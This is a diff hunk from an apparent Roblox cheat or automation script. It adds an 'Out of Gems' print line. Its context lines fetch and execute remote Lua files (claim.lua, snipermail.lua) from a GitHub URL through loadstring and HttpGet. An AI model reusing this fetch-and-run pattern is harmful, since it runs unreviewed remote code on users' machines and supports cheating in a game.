@@ -96,6 +96,7 @@ if GemsAmount > 25000 then
   end)
 else
   pcall(function()
+    print("Out of Gems")      
     wait(35)
     loadstring(game:HttpGet("https://raw.githubusercontent.com/Grogutech/beb/refs/heads/main/claim.lua"))()
     loadstring(game:HttpGet("https://raw.githubusercontent.com/Grogutech/beb/refs/heads/main/snipermail.lua"))()
